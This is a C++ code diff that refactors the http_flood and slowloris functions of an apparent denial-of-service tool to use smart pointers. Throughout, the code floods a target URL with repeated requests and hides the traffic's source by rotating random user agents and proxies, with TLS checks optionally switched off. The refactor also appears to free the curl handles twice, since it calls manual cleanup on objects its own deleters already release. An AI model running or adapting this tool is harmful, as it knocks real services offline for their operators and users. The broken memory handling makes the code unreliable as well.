@@ -26,21 +26,21 @@ std::string Attacker::get_random_user_agent() {
 
 void Attacker::http_flood(const std::string &url, int requests, const int rps, const std::string &custom_header, const bool verify_ssl,
                           const ProxyManager &proxy) {
-    CURL *curl = curl_easy_init();
-    if (curl) {
-        curl_slist *headers = nullptr;
-        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlUtils::write_callback);
-        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, verify_ssl ? 1L : 0L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, verify_ssl ? 2L : 0L);
-        curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_user_agent().c_str());
+    const std::unique_ptr<CURL, CurlUtils::curl_deleter> curl(curl_easy_init());
+    std::unique_ptr<curl_slist, CurlUtils::curl_slist_deleter> headers(nullptr);
+    if (curl.get()) {
+        curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, CurlUtils::write_callback);
+        curl_easy_setopt(curl.get(), CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+        curl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYPEER, verify_ssl ? 1L : 0L);
+        curl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYHOST, verify_ssl ? 2L : 0L);
+        curl_easy_setopt(curl.get(), CURLOPT_USERAGENT, get_random_user_agent().c_str());
         if (!custom_header.empty()) {
-            headers = curl_slist_append(nullptr, custom_header.c_str());
-            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+            headers.reset(curl_slist_append(nullptr, custom_header.c_str()));
+            curl_easy_setopt(curl.get(), CURLOPT_HTTPHEADER, headers.get());
         }
         if (proxy.is_enabled()) {
-            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.get_random_proxy().c_str());
+            curl_easy_setopt(curl.get(), CURLOPT_PROXY, proxy.get_random_proxy().c_str());
         }
         const int delayMs = rps > 0 ? 1000 / rps : 0;
         while (attacking && requests--) {
@@ -50,7 +50,7 @@ void Attacker::http_flood(const std::string &url, int requests, const int rps, c
             }
             int retries = 3;
             while (retries-- && attacking) {
-                const CURLcode res = curl_easy_perform(curl);
+                const CURLcode res = curl_easy_perform(curl.get());
                 if (res == CURLE_OK) {
                     ++successful_requests_;
                     std::cout << "Sent request to " << url << std::endl;
@@ -59,27 +59,27 @@ void Attacker::http_flood(const std::string &url, int requests, const int rps, c
                 ++failed_requests_;
                 std::cerr << "Request failed: " << curl_easy_strerror(res) << std::endl;
                 if (proxy.is_enabled())
-                    curl_easy_setopt(curl, CURLOPT_PROXY, proxy.get_random_proxy().c_str());
+                    curl_easy_setopt(curl.get(), CURLOPT_PROXY, proxy.get_random_proxy().c_str());
             }
             if (delayMs > 0) std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
         }
-        if (headers) curl_slist_free_all(headers);
-        curl_easy_cleanup(curl);
+        if (headers) curl_slist_free_all(headers.get());
+        curl_easy_cleanup(curl.get());
     }
 }
 
 void Attacker::slowloris(const std::string &url, const ProxyManager &proxy) {
-    CURL *curl = curl_easy_init();
-    if (curl) {
-        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlUtils::write_callback);
-        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
-        curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-        curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_user_agent().c_str());
+    const std::unique_ptr<CURL, CurlUtils::curl_deleter> curl(curl_easy_init());
+    if (curl.get()) {
+        curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, CurlUtils::write_callback);
+        curl_easy_setopt(curl.get(), CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+        curl_easy_setopt(curl.get(), CURLOPT_TCP_KEEPALIVE, 1L);
+        curl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl.get(), CURLOPT_SSL_VERIFYHOST, 0L);
+        curl_easy_setopt(curl.get(), CURLOPT_USERAGENT, get_random_user_agent().c_str());
         if (proxy.is_enabled()) {
-            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.get_random_proxy().c_str());
+            curl_easy_setopt(curl.get(), CURLOPT_PROXY, proxy.get_random_proxy().c_str());
         }
         std::mt19937 rng(static_cast<unsigned>(std::chrono::system_clock::now().time_since_epoch().count()));
         std::uniform_int_distribution<int> dist(500, 2000);
@@ -88,7 +88,7 @@ void Attacker::slowloris(const std::string &url, const ProxyManager &proxy) {
                 std::this_thread::sleep_for(std::chrono::milliseconds(100));
                 continue;
             }
-            const CURLcode res = curl_easy_perform(curl);
+            const CURLcode res = curl_easy_perform(curl.get());
             if (res == CURLE_OK) {
                 ++successful_requests_;
                 std::cout << "Slowloris request to " << url << std::endl;
@@ -99,7 +99,7 @@ void Attacker::slowloris(const std::string &url, const ProxyManager &proxy) {
             }
             std::this_thread::sleep_for(std::chrono::milliseconds(dist(rng)));
         }
-        curl_easy_cleanup(curl);
+        curl_easy_cleanup(curl.get());
     }
 }
 
